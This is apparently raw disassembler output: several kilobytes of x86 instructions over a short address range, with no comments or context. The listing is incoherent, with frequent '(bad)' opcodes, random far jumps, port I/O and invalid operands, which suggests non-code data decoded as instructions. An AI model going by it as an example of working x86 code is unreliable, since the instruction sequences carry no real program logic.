  41ab67:	gs cs xor eax,0x8f2c43e3
  41ab6e:	icebp  
  41ab6f:	je     0x41abf0
  41ab71:	mov    ds:0x95a16cd7,al
  41ab76:	inc    edi
  41ab77:	adc    esi,DWORD PTR [ecx]
  41ab79:	not    BYTE PTR [ecx]
  41ab7b:	cmp    ebp,DWORD PTR [ecx+0x370fbaad]
  41ab81:	add    al,0x1d
  41ab83:	out    0x98,eax
  41ab85:	push   ss
  41ab86:	ffreep st(1)
  41ab88:	jbe    0x41abe4
  41ab8a:	adc    ah,ah
  41ab8c:	mov    bl,0x38
  41ab8e:	and    BYTE PTR [ecx-0x12a89c6],0xad
  41ab95:	jmp    0x41ab3e
  41ab97:	mov    edi,0x65c6b19b
  41ab9c:	out    0x9f,eax
  41ab9e:	jns    0x41ac07
  41aba0:	test   DWORD PTR [ebx-0x8],0xc067bb53
  41aba7:	sub    edi,DWORD PTR [bp+0x79]
  41abab:	arpl   WORD PTR [ebx+0x1b],sp
  41abae:	arpl   WORD PTR [ecx],dx
  41abb0:	xchg   BYTE PTR [ecx],ah
  41abb2:	xor    ecx,DWORD PTR [esi+edi*8-0x70d2910a]
  41abb9:	jle    0x41ac1b
  41abbb:	mov    BYTE PTR [edx],al
  41abbd:	dec    eax
  41abbe:	sub    eax,0x2b9a17d5
  41abc3:	jno    0x41abcc
  41abc5:	jbe    0x41abe9
  41abc7:	inc    ebp
  41abc8:	aad    0xae
  41abca:	dec    ecx
  41abcb:	(bad)  
  41abcc:	and    al,0xf0
  41abce:	mov    al,0x91
  41abd0:	dec    DWORD PTR [ebp-0x20c19438]
  41abd6:	ins    DWORD PTR es:[edi],dx
  41abd7:	aam    0xca
  41abd9:	jnp    0x41ab64
  41abdb:	ins    DWORD PTR es:[edi],dx
  41abdc:	dec    ebx
  41abdd:	sti    
  41abde:	pop    edx
  41abdf:	aas    
  41abe0:	sbb    bh,BYTE PTR [esi+0x42]
  41abe3:	xchg   ebx,eax
  41abe4:	sub    ch,BYTE PTR [eax]
  41abe6:	jb     0x41ac15
  41abe8:	xor    BYTE PTR [ebx+edx*2+0x71],bh
  41abec:	dec    edx
  41abee:	mov    ah,0xb3
  41abf0:	and    al,0xd8
  41abf2:	jns    0x41ac24
  41abf4:	mov    esi,0x59b4a371
  41abf9:	cmp    al,0x2f
  41abfb:	(bad)  
  41abfc:	retf   0xe8e0
  41abff:	jle    0x41aba5
  41ac01:	lock ror DWORD PTR [ebp+0x2deeb65a],cl
  41ac08:	aaa    
  41ac09:	xor    DWORD PTR [ecx-0x7ed9a79e],0x23
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edi+ebx*4-0x50]
  41ac82:	popa   
  41ac83:	daa    
  41ac84:	add    BYTE PTR [ecx+eax*1],bl
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	pushf  
  41ac8d:	pop    edi
  41ac8e:	add    edx,eax
  41ac90:	outs   dx,DWORD PTR ds:[esi]
  41ac91:	add    al,0xcc
  41ac93:	shl    DWORD PTR [edi*2+0x48519022],0xeb
  41ac9b:	or     ebx,edx
  41ac9d:	scas   al,BYTE PTR es:[edi]
  41ac9e:	sbb    eax,0x560e3c19
  41aca3:	(bad)  
  41aca4:	rdtsc  
  41aca6:	aaa    
  41aca7:	xchg   edx,eax
  41aca8:	nop
  41aca9:	test   eax,0x1906d37a
  41acae:	inc    edi
  41acaf:	data16 mov BYTE PTR [eax],bl
  41acb2:	cwde   
  41acb3:	or     bh,BYTE PTR [edi-0x34b5b8fd]
  41acb9:	cmp    BYTE PTR [ebp-0x80],dh
  41acbc:	jp     0x41ad2c
  41acbe:	jb     0x41acb2
  41acc0:	outs   dx,BYTE PTR ds:[esi]
  41acc1:	es ins BYTE PTR es:[edi],dx
  41acc3:	jno    0x41acb4
  41acc5:	js     0x41acf5
  41acc7:	ins    BYTE PTR es:[edi],dx
  41acc8:	rcr    BYTE PTR ds:0x5819cf39,1
  41acce:	cmp    al,0x54
  41acd0:	call   0xb8b:0xb85f8100
  41acd7:	mov    eax,0xdbc864d4
  41acdc:	push   eax
  41acdd:	jge    0x41ad47
  41acdf:	or     BYTE PTR [edx-0x3cff5158],0xf5
  41ace6:	or     ah,BYTE PTR [esi+0x9]
  41ace9:	add    DWORD PTR [edi],esp
  41aceb:	and    al,0xb3
  41aced:	adc    BYTE PTR [ebx-0x65],0x6a
  41acf1:	push   ecx
  41acf2:	test   BYTE PTR [esi+ecx*2+0x3],bl
  41acf6:	sahf   
  41acf7:	pusha  
  41acf8:	mov    edi,0x53d0c69b
  41acfd:	jmp    0x41ad45
  41acff:	push   esi
  41ad00:	(bad)  
  41ad01:	mov    edi,0x5fb630e2
  41ad06:	push   eax
  41ad07:	and    ebx,DWORD PTR [eax]
  41ad09:	jp     0x41acb9
  41ad0b:	rol    WORD PTR [ebx+0x34035efb],1
  41ad12:	stc    
  41ad13:	sub    eax,0xf8fc786c
  41ad18:	mov    al,ds:0x630e450f
  41ad1d:	fwait
  41ad1e:	dec    ebp
  41ad1f:	cdq    
  41ad20:	inc    ecx
  41ad21:	cdq    
  41ad22:	jecxz  0x41ad54
  41ad24:	push   esi
  41ad25:	xor    eax,0x93d5aa6b
  41ad2a:	sbb    BYTE PTR [ecx+0x47],0x9b
  41ad2e:	mov    cs,WORD PTR [ecx-0x23]
  41ad31:	ins    DWORD PTR es:[edi],dx
  41ad32:	jbe    0x41ad73
  41ad34:	enter  0xcdfd,0x1e
  41ad38:	or     edi,esi
  41ad3a:	out    0x51,al
  41ad3c:	pop    ebx
  41ad3d:	add    DWORD PTR [ecx+eiz*2-0x121a6577],0x82357572
  41ad48:	lahf   
  41ad49:	mov    DWORD PTR [esi+edi*8-0x5],eax
  41ad4d:	inc    ebp
  41ad4e:	lahf   
  41ad4f:	cli    
  41ad50:	fimul  WORD PTR [ebp+0x70]
  41ad53:	into   
  41ad54:	push   edi
  41ad55:	dec    edi
  41ad56:	add    eax,0x7cfa81ed
  41ad5b:	fiadd  DWORD PTR [edi+ebp*1-0x25]
  41ad5f:	push   edi
  41ad60:	mov    eax,esi
  41ad62:	call   0x86f6:0x8ef663f1
  41ad69:	pop    es
  41ad6a:	dec    eax
  41ad6b:	enter  0x152d,0xbf
  41ad6f:	sbb    al,0x6c
  41ad71:	inc    eax
  41ad72:	shr    DWORD PTR [esi-0xe4a6aeb],cl
  41ad78:	jno    0x41ad0c
  41ad7a:	arpl   WORD PTR ds:0x5043d228,cx
  41ad80:	(bad)  
  41ad81:	popa   
  41ad82:	jmp    0x41ad85
  41ad84:	imul   ebp,DWORD PTR [ecx+0x3e],0x33
  41ad88:	in     eax,dx
  41ad89:	push   0xffffffb2
  41ad8b:	mov    eax,0xf134000a
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ecx+esi*8+0x4c03c48],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	adc    BYTE PTR [esi+0x4c],al
  41ae0f:	xchg   di,bp
  41ae12:	adc    cl,BYTE PTR [edi]
  41ae14:	cmp    BYTE PTR [edx+0x21],al
  41ae17:	mov    ds:0x58c881ff,al
  41ae1c:	retf   0xe83c
  41ae1f:	and    al,0x63
  41ae21:	mov    cl,BYTE PTR [edi-0x307e5c8b]
  41ae27:	fcmovnb st,st(1)
  41ae29:	lods   eax,DWORD PTR ds:[esi]
  41ae2a:	dec    esi
  41ae2b:	xor    al,ah
  41ae2d:	or     ecx,DWORD PTR [edi+0x44a197c2]
  41ae33:	arpl   WORD PTR ds:0xb7379eda,si
  41ae39:	sbb    eax,0x8a1e3c70
  41ae3e:	(bad)  [edx+0x4baee9b9]
  41ae44:	scas   eax,DWORD PTR es:[edi]
  41ae45:	loopne 0x41adec
  41ae47:	cmp    eax,0x35dc3d40
  41ae4c:	(bad)  
  41ae4e:	(bad)  
  41ae4f:	jo     0x41ae85
  41ae51:	mov    gs:0x69c407c7,eax
  41ae57:	aaa    
  41ae58:	ret    0x1f14
  41ae5b:	out    dx,eax
  41ae5c:	add    al,0xca
  41ae5e:	cmc    
  41ae5f:	add    dl,BYTE PTR [edx+eiz*2]
  41ae62:	fwait
  41ae63:	in     al,0x29
  41ae65:	mov    edi,0x82623ded
  41ae6a:	mov    al,ds:0x636200e9
  41ae6f:	pop    es
  41ae70:	push   ds
  41ae71:	mov    dh,0x3b
  41ae73:	cmp    BYTE PTR [edx],ch
  41ae75:	push   es
  41ae76:	cmp    edx,DWORD PTR cs:[ebx+ecx*1]
  41ae7a:	and    al,0x92
  41ae7c:	bound  ebp,QWORD PTR [edx+0x2b2a5a24]
  41ae82:	cwde   
  41ae83:	retf   
  41ae84:	cli    
  41ae85:	aas    
  41ae86:	in     eax,dx
  41ae87:	fucom  st(2)
  41ae89:	test   DWORD PTR [edi],0xfda439ec
  41ae8f:	add    eax,0xd9d3a89b
  41ae94:	add    al,0xfe
  41ae96:	jmp    0x42b0:0x60c970f2
  41ae9d:	pop    edx
  41ae9e:	xor    al,BYTE PTR [esi-0x75]
  41aea1:	mov    ds:0x2127fb8a,eax
  41aea6:	fmul   DWORD PTR [edx-0x7db26bfe]
  41aeac:	lds    esi,FWORD PTR [ebx-0x43]
  41aeaf:	adc    DWORD PTR [ebx-0x63],edx
  41aeb2:	in     eax,0x8
  41aeb4:	lahf   
  41aeb5:	mov    ebx,0xd7d16597
  41aeba:	(bad)  
  41aebb:	mov    ebp,0xccd3c696
  41aec0:	pop    es
  41aec1:	push   ebx
  41aec2:	lea    ebx,gs:[edi+0x1]
  41aec6:	add    eax,0xcfe50601
  41aecb:	push   ecx
  41aecc:	imul   DWORD PTR [ebp-0x6d]
  41aecf:	(bad)  
  41aed0:	push   ds
  41aed1:	fsub   QWORD PTR [ebx+0x1b]
  41aed4:	jge    0x41aea7
  41aed6:	std    
  41aed7:	pusha  
  41aed8:	pop    edi
  41aed9:	out    0xc8,al
  41aedb:	cli    
  41aedc:	sbb    DWORD PTR [edi],eax
  41aede:	or     BYTE PTR [ebx-0x5f7889c9],dh
  41aee4:	mov    eax,0x6f6170da
  41aee9:	sbb    bl,ah
  41aeeb:	sbb    BYTE PTR [eax],ah
  41aeed:	jg     0x41af4d
  41aeef:	(bad)  
  41aef0:	sti    
  41aef1:	pop    ds
  41aef2:	shl    BYTE PTR [edi],cl
  41aef4:	dec    esi
  41aef5:	xor    BYTE PTR [edi+0x4e],bl
  41aef8:	jg     0x41aef5
  41aefa:	push   edi
  41aefb:	stc    
  41aefc:	lods   al,BYTE PTR ds:[esi]
  41aefd:	sbb    DWORD PTR [edx+0x33fc19e7],0x7b
  41af04:	cmc    
  41af05:	and    eax,DWORD PTR [ebx+0x51]
  41af08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af09:	push   edi
  41af0a:	lods   al,BYTE PTR ds:[esi]
  41af0b:	sbb    eax,0xe5d76112
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xa70d44ee
  41af82:	mov    edx,0x11e0851
  41af87:	add    BYTE PTR [ecx+eax*1],al
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	and    ah,BYTE PTR [ecx-0x20]
  41af8f:	push   edx
  41af90:	ret    
  41af91:	mov    bh,0x8b
  41af93:	(bad)
  41af98:	or     cl,dh
  41af9a:	jl     0x41afed
  41af9c:	mov    ds:0x4dc985f7,al
  41afa1:	(bad)  [eax-0x13]
  41afa4:	rol    DWORD PTR [esi+0x6],0xdc
  41afa8:	(bad)  
  41afa9:	(bad)  
  41afaa:	pop    esp
  41afab:	cs jo  0x41afc1
  41afae:	dec    ebp
  41afaf:	jp     0x41afb0
  41afb1:	ins    DWORD PTR es:[edi],dx
  41afb2:	inc    ecx
  41afb3:	aas    
  41afb4:	pop    ebx
  41afb5:	push   edx
  41afb6:	iret   
  41afb7:	retf   0x1806
  41afba:	mov    dh,0xbf
  41afbc:	adc    eax,0x7a7459b5
  41afc1:	xchg   cl,dh
  41afc3:	pop    ss
  41afc4:	jo     0x41af9c
  41afc6:	push   ebp
  41afc7:	mov    al,ds:0xc68e29fb
  41afcc:	sbb    BYTE PTR [eax-0x71],dh
  41afcf:	or     edx,edx
  41afd1:	outs   dx,BYTE PTR ds:[esi]
  41afd2:	out    dx,al
  41afd3:	(bad)  
  41afd4:	mov    eax,DWORD PTR [eax+0x7c]
  41afd7:	inc    edi
  41afd8:	pop    es
  41afd9:	push   edi
  41afda:	nop
  41afdb:	jmp    0xa2248343
  41afe0:	cdq    
  41afe1:	ror    BYTE PTR ds:0x29fbde22,0x1a
  41afe8:	aad    0x59
  41afea:	mov    al,ds:0xf737cace
  41afef:	int    0x29
  41aff1:	loop   0x41afa4
  41aff3:	inc    edi
  41aff4:	and    DWORD PTR [ebx-0x2356b73b],edi
  41affa:	jle    0x41affa
  41affc:	retf   
  41affd:	rcr    DWORD PTR [esi],cl
  41afff:	push   0xe6a6bb80
  41b004:	and    edx,DWORD PTR [ebx+0x5b]
  41b007:	or     al,0x8a
  41b009:	fldenv [esi]
  41b00b:	fwait
  41b00c:	aas    
  41b00d:	pop    esp
  41b00e:	je     0x41afde
  41b010:	pop    ds
  41b011:	inc    eax
  41b012:	retf   
  41b013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b014:	in     eax,0x39
  41b016:	fld    TBYTE PTR [ecx]
  41b018:	js     0x41b044
  41b01a:	cs aad 0x15
  41b01d:	das    
  41b01e:	ret    
  41b01f:	mov    ds:0x572410e1,al
  41b024:	out    0x4f,eax
  41b026:	outs   dx,DWORD PTR ds:[esi]
  41b027:	jmp    0x59af3fcc
  41b02c:	push   edi
  41b02d:	sub    esi,DWORD PTR [edi+0x2e31715]
  41b033:	xlat   BYTE PTR ds:[ebx]
  41b034:	xchg   edx,eax
  41b035:	mov    bh,0x29
  41b037:	cmp    eax,DWORD PTR [edi]
  41b039:	data16 jne 0x41b02f
  41b03c:	mov    edx,0xbdf27de4
  41b041:	shl    DWORD PTR [eax-0x739292e],cl
  41b047:	or     DWORD PTR [ebx],edx
  41b049:	push   es
  41b04a:	jp     0x41b062
  41b04c:	ins    BYTE PTR es:[edi],dx
  41b04d:	test   al,0x78
  41b04f:	scas   eax,DWORD PTR es:[edi]
  41b050:	stos   BYTE PTR es:[edi],al
  41b051:	hlt    
  41b052:	stos   DWORD PTR es:[edi],eax
  41b053:	pop    esp
  41b054:	mov    bh,0x2
  41b056:	loop   0x41b051
  41b058:	adc    al,0xf
  41b05a:	jl     0x41b0b4
  41b05c:	mov    al,0x6d
  41b05e:	clc    
  41b05f:	sbb    BYTE PTR [ecx+0x64],dl
  41b062:	cmp    DWORD PTR [edi+0xf32d706],ebp
  41b068:	mov    eax,ds:0x43e9ecf3
  41b06d:	jl     0x41b059
  41b06f:	out    dx,al
  41b070:	into   
  41b071:	retf   
  41b072:	aas    
  41b073:	in     al,dx
  41b074:	jno    0x41b005
  41b076:	bound  esi,QWORD PTR ds:0x6df40dd0
  41b07c:	inc    ecx
  41b07d:	(bad)  
  41b07e:	pop    ebp
  41b07f:	and    al,0x18
  41b081:	call   esp
  41b083:	mov    ecx,0x24b4c466
  41b088:	ret    0x534c
  41b08b:	mov    ax,0xf180
  41b08f:	and    DWORD PTR [eax],eax
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x64c91c4b
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	imul   esp,ebp,0xffffff8e
  41b10f:	xchg   ebp,eax
  41b110:	fs addr16 push edi
  41b113:	sbb    al,0xe8
  41b115:	jbe    0x41b0c7
  41b117:	loop   0x41b142
  41b119:	xchg   ecx,eax
  41b11a:	mov    ecx,0x8d7dd7ab
  41b11f:	aas    
  41b120:	shl    BYTE PTR [ebx-0x2d],0xef
  41b124:	rol    DWORD PTR [edi],cl
  41b126:	xchg   edx,eax
  41b127:	ins    BYTE PTR es:[edi],dx
  41b128:	lods   eax,DWORD PTR ds:[esi]
  41b129:	xchg   BYTE PTR [edx],dh
  41b12b:	mov    al,ds:0xaf8a136
  41b130:	fisttp QWORD PTR [ebp-0x67ea279d]
  41b136:	xor    dl,BYTE PTR [ecx+0x43e39b19]
  41b13c:	jmp    0xa63ae705
  41b141:	mov    al,ds:0xd5cdfda4
  41b146:	stos   DWORD PTR es:[edi],eax
  41b147:	jg     0x41b116
  41b149:	ret    0x1e80
  41b14c:	dec    eax
  41b14d:	fistp  QWORD PTR [eax-0x7]
  41b150:	push   edi
  41b151:	mov    bl,0x92
  41b153:	outs   dx,DWORD PTR ds:[esi]
  41b154:	jae    0x41b17c
  41b156:	bound  esp,QWORD PTR [edx+0x32]
  41b159:	xor    eax,0x4f539659
  41b15e:	jmp    0x6c0d:0xe09659fe
  41b165:	fadd   st(0),st
  41b167:	std    
  41b168:	jbe    0x41b116
  41b16a:	outs   dx,BYTE PTR ds:[esi]
  41b16b:	cld    
  41b16c:	cmp    DWORD PTR [edx+edx*4-0x40ea7b80],0xfccc0920
  41b177:	mov    al,ds:0xe7998e66
  41b17c:	fwait
  41b17d:	or     bl,BYTE PTR [edx]
  41b17f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b180:	jae    0x41b174
  41b182:	test   dl,0x33
  41b185:	outs   dx,DWORD PTR ds:[esi]
  41b186:	ss int 0xdd
  41b189:	push   ebx
  41b18a:	dec    edx
  41b18b:	test   DWORD PTR [edi],edi
  41b18d:	jno    0x41b1fa
  41b18f:	add    eax,0x5931285e
  41b194:	xchg   eax,ecx
  41b196:	fwait
  41b197:	sti    
  41b198:	dec    ecx
  41b199:	scas   eax,DWORD PTR es:[edi]
  41b19a:	mov    dh,0x8a
  41b19c:	mov    eax,ds:0xf54c9273
  41b1a1:	stos   DWORD PTR es:[edi],eax
  41b1a2:	sbb    eax,0x4403ef8f
  41b1a7:	jb     0x41b156
  41b1a9:	adc    eax,0xfe343972
  41b1ae:	or     dh,BYTE PTR [ebx]
  41b1b0:	push   ebx
  41b1b1:	cs popf 
  41b1b3:	jbe    0x41b230
  41b1b5:	lock ror DWORD PTR [esi],0xca
  41b1b9:	xlat   BYTE PTR ds:[ebx]
  41b1ba:	retf   0xc25d
  41b1bd:	pusha  
  41b1be:	sbb    DWORD PTR [ecx-0x23ce585a],0xffffffdd
  41b1c5:	push   ebp
  41b1c6:	mov    ?,eax
  41b1c8:	div    DWORD PTR [esi+eiz*2+0x3b6e2d]
  41b1cf:	popf   
  41b1d0:	mov    ecx,0x761cb787
  41b1d5:	iret   
  41b1d6:	jo     0x41b206
  41b1d8:	aas    
  41b1d9:	mov    ebp,edi
  41b1db:	dec    eax
  41b1dc:	cmc    
  41b1dd:	dec    eax
  41b1de:	mov    ebx,0x73fb492b
  41b1e3:	into   
  41b1e4:	je     0x41b1e4
  41b1e6:	out    dx,al
  41b1e7:	loope  0x41b245
  41b1e9:	dec    esp
  41b1ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1eb:	(bad)  [edi+0x6410a35f]
  41b1f1:	repnz fdivr st,st(5)
  41b1f4:	push   0xc2c527b6
  41b1f9:	ror    al,0xa9
  41b1fc:	out    0x9c,eax
  41b1fe:	mov    ebx,0x5524f25
  41b203:	inc    ebx
  41b204:	or     BYTE PTR [eax+esi*2+0x3018a893],dh
  41b20b:	push   ebx
  41b20c:	xor    al,0x26
  41b20e:	stos   DWORD PTR es:[edi],eax
  41b20f:	int    0x0
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ecx+0x10873908],ch
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	(bad)
  41b28f:	clc    
  41b290:	pop    ss
  41b291:	pop    esp
  41b292:	ror    ebx,0x64
  41b295:	mov    eax,0x5b85e835
  41b29a:	pusha  
  41b29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b29c:	dec    edi
  41b29d:	mov    bh,0x13
  41b29f:	adc    dl,dh
  41b2a1:	adc    BYTE PTR [ebx-0x30fc579b],0xf2
  41b2a8:	sbb    DWORD PTR [ebx],eax
  41b2aa:	push   0x7ac3fb69
  41b2af:	lds    ebp,FWORD PTR [esi-0x4e]
  41b2b2:	dec    ecx
  41b2b3:	out    dx,al
  41b2b4:	les    edx,FWORD PTR [edx+esi*4]
  41b2b7:	mov    dl,0x5f
  41b2b9:	pop    ebp
  41b2ba:	add    BYTE PTR [eax+0x3c9c5fb7],bh
  41b2c0:	xchg   DWORD PTR [ecx+0x69d3b40e],eax
  41b2c6:	lock (bad) 
  41b2c8:	fisubr DWORD PTR [edi*2-0x60732b32]
  41b2cf:	out    0x7c,al
  41b2d1:	mov    eax,ds:0xfd31d9f8
  41b2d6:	mov    esi,0xd1969698
  41b2db:	mov    bh,0xde
  41b2dd:	es clc 
  41b2df:	mov    ah,0x73
  41b2e1:	xor    cl,BYTE PTR [ecx+0x2a]
  41b2e4:	xor    al,cl
  41b2e6:	sti    
  41b2e7:	aam    0xdd
  41b2e9:	xlat   BYTE PTR ds:[ebx]
  41b2ea:	outs   dx,BYTE PTR ds:[esi]
  41b2eb:	xchg   BYTE PTR ds:0x47f338e6,bl
  41b2f1:	lods   eax,DWORD PTR ds:[esi]
  41b2f2:	pop    es
  41b2f3:	mov    DWORD PTR [ebx],ebp
  41b2f5:	or     bl,al
  41b2f7:	push   edi
  41b2f8:	out    dx,al
  41b2f9:	enter  0xb8ca,0xc9
  41b2fd:	dec    esp
  41b2fe:	mov    esp,DWORD PTR [ebx+0x78a304c1]
  41b304:	and    DWORD PTR [edx-0x19],esi
  41b307:	mov    eax,0x52092b0c
  41b30c:	int3   
  41b30d:	push   ecx
  41b30e:	cmp    ecx,edx
  41b310:	cmc    
  41b311:	jns    0x41b37d
  41b313:	push   edx
  41b314:	je     0x41b30f
  41b316:	nop
  41b317:	(bad)  
  41b318:	in     eax,dx
  41b319:	out    0x3a,eax
  41b31b:	call   FWORD PTR [edx+0x5cc77a7f]
  41b321:	jmp    DWORD PTR [edi]
  41b323:	gs (bad) 
  41b326:	sbb    eax,0x491ed0bb
  41b32b:	dec    edi
  41b32c:	cmovno eax,DWORD PTR [eax-0x5d]
  41b330:	xchg   ah,cl
  41b332:	pusha  
  41b333:	mov    dh,0xa1
  41b335:	add    al,0xf2
  41b337:	sub    ecx,edx
  41b339:	(bad)
  41b33c:	stc    
  41b33d:	fucomip st,st(0)
  41b33f:	fs iret 
  41b341:	sahf   
  41b342:	and    DWORD PTR fs:[esi-0x7b],edx
  41b346:	cwde   
  41b347:	iret   
  41b348:	xor    DWORD PTR [ecx],edx
  41b34a:	mov    dl,0xd7
  41b34c:	mov    bl,0x29
  41b34e:	sbb    bh,BYTE PTR [ecx]
  41b350:	mov    eax,ecx
  41b352:	jle    0x41b3c5
  41b354:	repnz xor cl,BYTE PTR [edi-0x11dcb1e4]
  41b35b:	adc    edx,esp
  41b35d:	popf   
  41b35e:	imul   DWORD PTR [edx+0x71f5a269]
  41b364:	mov    ah,0x5a
  41b366:	or     al,0xb6
  41b368:	xchg   edi,eax
  41b369:	push   ss
  41b36a:	xchg   edx,eax
  41b36b:	ds (bad) 
  41b36e:	add    eax,0x72655e99
  41b373:	mov    bh,0xd6
  41b375:	in     al,0x6c
  41b377:	je     0x41b3ed
  41b379:	xchg   ebx,eax
  41b37a:	int3   
  41b37b:	das    
  41b37c:	daa    
  41b37d:	sar    BYTE PTR [ecx],1
  41b37f:	jns    0x41b3d8
  41b381:	xor    BYTE PTR [edi-0x7a],0xce
  41b385:	retf   
  41b386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b387:	jmp    0x41b30d
  41b389:	fmul   st(5),st
  41b38b:	fcmovb st,st(4)
  41b38d:	adc    DWORD PTR [esi],eax
  41b38f:	add    BYTE PTR fs:[eax],al
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	gs xor ecx,ecx
  41b403:	ja     0x41b419
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR [ecx+eax*1],al
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	ret    0x2424
  41b40f:	pop    esi
  41b410:	jnp    0xcea11802
  41b416:	jno    0x41b476
  41b418:	mov    ebp,0xf76dc5bd
  41b41d:	lds    ebp,FWORD PTR [esi+0x2168bf40]
  41b423:	adc    eax,0xf6d63abe
  41b428:	add    DWORD PTR [esi],edx
  41b42a:	xchg   esi,eax
  41b42b:	loopne 0x41b40e
  41b42d:	clc    
  41b42e:	ins    BYTE PTR es:[edi],dx
  41b42f:	pop    ss
  41b430:	lea    ecx,[edi-0x47]
  41b433:	adc    eax,0x753d42ee
  41b438:	std    
  41b439:	push   0xa587d965
  41b43e:	jecxz  0x41b487
  41b440:	shl    BYTE PTR [edi],1
  41b442:	sbb    DWORD PTR [ecx+edi*8],edx
  41b445:	aaa    
  41b446:	mov    esi,0xf2b7037c
  41b44b:	mov    al,ds:0xe9d4dd3c
  41b450:	dec    ecx
  41b451:	lahf   
  41b452:	xor    al,0xd0
  41b454:	out    dx,al
  41b455:	jg     0x41b41f
  41b457:	les    ebp,FWORD PTR [eax-0x53]
  41b45a:	std    
  41b45b:	push   ebx
  41b45c:	pop    esi
  41b45d:	nop
  41b45e:	arpl   WORD PTR [ebx+0x2f74f1a5],dx
  41b464:	int3   
  41b465:	sub    BYTE PTR [ebp+0x7463f706],dh
  41b46b:	jmp    0x78ee33ea
  41b470:	push   ss
  41b471:	sub    dh,BYTE PTR [edx]
  41b473:	adc    al,0xa1
  41b475:	mov    al,0x16
  41b477:	das    
  41b478:	div    DWORD PTR [eax+eiz*1-0x2e788aa7]
  41b47f:	pop    ecx
  41b480:	dec    esp
  41b481:	xchg   edx,eax
  41b482:	mov    ah,0x60
  41b484:	push   ebx
  41b485:	clc    
  41b486:	shl    BYTE PTR [eax+eiz*2-0x425396d2],cl
  41b48d:	push   ds
  41b48e:	aaa    
  41b48f:	add    DWORD PTR [ebx-0x41d9577d],ebx
  41b495:	and    BYTE PTR [eax+0x2e],0x28
  41b499:	push   edi
  41b49a:	call   0x18bd:0x20532ccc
  41b4a1:	xor    ah,BYTE PTR [esi-0x51e44c8e]
  41b4a7:	rol    BYTE PTR [edi+0x34ee9c31],cl
  41b4ad:	push   esi
  41b4ae:	sbb    eax,esi
  41b4b0:	cmp    esp,DWORD PTR [eax]
  41b4b2:	adc    al,0xee
  41b4b4:	push   esi
  41b4b5:	fdivr  st(3),st
  41b4b7:	loope  0x41b4fd
  41b4b9:	mov    ebp,0x5405c58
  41b4be:	xchg   edi,eax
  41b4bf:	enter  0xe923,0xb4
  41b4c3:	call   0x52679992
  41b4c8:	sbb    BYTE PTR [ecx],al
  41b4ca:	inc    esi
  41b4cb:	gs out 0xe9,eax
  41b4ce:	adc    DWORD PTR [edi],esi
  41b4d0:	jle    0x41b4d8
  41b4d2:	push   ecx
  41b4d3:	fild   DWORD PTR [eax+eiz*2]
  41b4d6:	gs jg  0x41b538
  41b4d9:	xor    BYTE PTR [ebp+0x6],dh
  41b4dc:	mov    bh,ah
  41b4de:	les    ecx,FWORD PTR [edx]
  41b4e0:	xchg   ebx,eax
  41b4e1:	stc    
  41b4e2:	stc    
  41b4e3:	mov    ebx,0x2605fafe
  41b4e8:	inc    edx
  41b4e9:	retf   
  41b4ea:	mov    esp,0x1bea5443
  41b4ef:	mov    ch,0x72
  41b4f1:	pop    edx
  41b4f2:	jnp    0x41b525
  41b4f4:	lahf   
  41b4f5:	sub    esp,ecx
  41b4f7:	xchg   ecx,eax
  41b4f8:	jg     0x41b575
  41b4fa:	sti    
  41b4fb:	push   edi
  41b4fc:	test   BYTE PTR [eax-0x19405560],bl
  41b502:	not    BYTE PTR [edi-0x3]
  41b505:	sub    DWORD PTR [edi-0x7],esi
  41b508:	dec    edx
  41b509:	dec    esi
  41b50a:	mov    ah,0xbc
  41b50c:	pop    ebp
  41b50d:	int    0xf3
  41b50f:	fild   DWORD PTR [eax]
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	xor    eax,0x1851ee02
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	mov    edi,0x17ebb483
